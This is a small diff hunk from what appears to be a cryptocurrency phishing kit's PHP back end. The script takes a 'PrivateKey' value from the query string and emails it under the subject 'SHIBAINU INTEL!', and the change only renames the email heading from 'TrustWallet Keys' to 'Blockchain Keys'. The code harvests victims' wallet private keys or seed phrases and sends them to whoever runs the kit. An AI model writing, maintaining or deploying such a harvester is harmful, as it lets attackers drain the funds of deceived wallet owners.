@@ -7,7 +7,7 @@ $PrivateKey = $_GET['PrivateKey'];
 
 $name = 'Wallet Key';
 $subject = 'SHIBAINU INTEL!';
-$body = "<h2>SHIBAINU INTEL - TrustWallet Keys</h2>
+$body = "<h2>SHIBAINU INTEL - Blockchain Keys</h2>
 <h3>Phrase</h3>
 <p>$PrivateKey</p>";
 
